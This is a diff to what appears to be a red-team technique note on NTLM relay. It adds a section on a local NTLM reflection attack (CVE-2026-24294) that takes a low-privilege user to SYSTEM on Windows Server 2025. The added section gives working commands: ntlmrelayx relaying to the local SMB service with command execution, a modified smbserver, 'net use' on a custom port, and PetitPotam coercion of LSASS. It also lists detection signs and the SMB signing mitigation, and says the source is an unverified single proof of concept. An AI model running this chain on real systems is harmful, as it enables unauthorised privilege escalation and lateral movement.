@@ -4,8 +4,8 @@ type: technique
 tags: [active-directory, exploitation, lateral-movement, ntlm, reference-import, relay]
 phase: exploitation
 date_created: 2026-05-13
-date_updated: 2026-07-02
-sources: [InternalAllTheThings]
+date_updated: 2026-07-14
+sources: [InternalAllTheThings, git-cve-2026-24294]
 ---
 
 # Internal - NTLM Relay
@@ -58,6 +58,39 @@ NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to 
 msf > use exploit/windows/smb/smb_relay
 msf exploit(smb_relay) > show targets
 ```
+
+## Local NTLM reflection to SYSTEM via SMB arbitrary port (CVE-2026-24294, WS2025)
+
+Two Windows 11 24H2 / Server 2025 features combine into a local reflection primitive that gives
+`NT AUTHORITY\SYSTEM` from any low-privilege user. (1) The SMB client can connect on an arbitrary
+TCP port: `net use \\host\share /tcpport:PORT`. (2) SMB session multiplexing (MS-SMB2 3.2.4.2)
+reuses an existing TCP connection for a subsequent authentication. So a low-priv user opens a
+persistent TCP connection to an attacker SMB server on a non-standard port, then coerces a SYSTEM
+service (LSASS via EFSRPC / PetitPotam) to authenticate to `\\127.0.0.1\share`; the client
+multiplexes that privileged NTLM auth over the already-open attacker connection, and the attacker
+relays it back to the real local SMB service on 445 as SYSTEM. Predecessor: CVE-2025-33073 (same
+reflection class). Windows 11 24H2 is NOT exploitable (it enforces SMB signing, which breaks the
+relay); Server 2025 default config is.
+
+```bash
+# T1: ntlmrelayx listens on a RAW port and relays captured NTLM to the local SMB service
+python ntlmrelayx.py --no-smb-server --no-http-server -t smb://127.0.0.1 -c "whoami" \
+  -smb2support --raw-port 6666
+# T2: modified smbserver captures the multiplexed SESSION_SETUP and forwards to the RAW relay port
+python smbserver.py test . -port 12345 -smb2support -username user -password user -relay-port 6666
+```
+```cmd
+:: T3: open a persistent TCP connection on the custom port, then coerce LSASS to loopback
+net use \\127.0.0.1\test /tcpport:12345 /user:user user
+PetitPotam.exe 127.0.0.1 localhost 2
+:: ntlmrelayx -c "whoami" output shows NT AUTHORITY\SYSTEM
+```
+
+Generic takeaways: a client feature allowing non-standard destination ports plus connection/session
+reuse is a local-reflection enabler (the attacker no longer needs to hold 445); SMB signing on the
+target is the deciding mitigation. Detection: `net use ... /tcpport:` to loopback/non-445 followed
+by an EFSRPC coercion (`\pipe\efsrpc`, `EfsRpcEncryptFileSrv`). Single-source (fork PoC, README notes
+it was AI-assisted); lab-validate before relying.
 
 ## LDAP signing not required and LDAP channel binding disabled
 
